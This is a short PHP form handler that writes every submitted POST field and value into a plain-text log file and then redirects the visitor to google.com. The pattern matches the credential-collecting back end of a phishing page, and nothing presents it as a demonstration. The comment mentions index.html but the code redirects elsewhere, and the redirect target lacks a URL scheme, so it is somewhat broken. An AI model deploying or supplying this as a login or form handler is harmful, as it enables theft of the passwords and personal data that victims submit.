<?php
// Open the file 'log_info.txt' in append mode
$file = fopen("log_info.txt", "a");

// Write an indentation and a new line for formatting
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "\r\n");

// Loop through each POST variable to log its key and value
foreach ($_POST as $variable => $value) {
    fwrite($file, $variable); // Write the variable name
    fwrite($file, "=");       // Write an equals sign
    fwrite($file, $value);    // Write the variable value
    fwrite($file, "\r\n");    // Write a new line
}

// Add another new line and some spacing for clarity in the log file
fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t\t");

// Close the file
fclose($file);

// Redirect to the new desired page (replace 'index.html' with your page)
header("Location: google.com");
die();
?>
